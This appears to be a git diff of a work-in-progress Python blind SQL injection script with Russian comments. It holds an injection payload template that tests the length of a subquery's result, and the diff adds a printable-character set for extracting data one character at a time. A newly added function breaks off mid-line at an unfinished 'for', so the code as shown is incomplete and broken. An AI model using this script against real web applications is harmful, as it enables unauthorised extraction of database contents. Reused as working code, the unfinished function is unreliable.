@@ -5,6 +5,7 @@ code in process
 import sys
 import logging
 import urllib3
+import string
 
 import requests
 
@@ -21,8 +22,16 @@ logging.basicConfig(
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-
+"""
+IPython (англ. Interactive Python)
+через него запустили скрипт
+import string
+string.printable
+"""
+#что в итоге нам выдало: 
+#Out[2]: '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c' 
+AVAIL_CHARS = string.printable 
+#и переменная avail_char (доступные символы хранит в себе подобный response)
 def format_length_query(inner_query, length):
     return f"xyz' or (select length(({inner_query}))={length})-- "
 
@@ -60,6 +69,10 @@ def determine_response_length(inner_query, url, no_proxy=False):
             response_length = i
             log.info(f"Length of query response is {response_length}")
             return i
+
+
+def determind_response_char(inner_query, index):
+    for 
 
 
 def main(args):
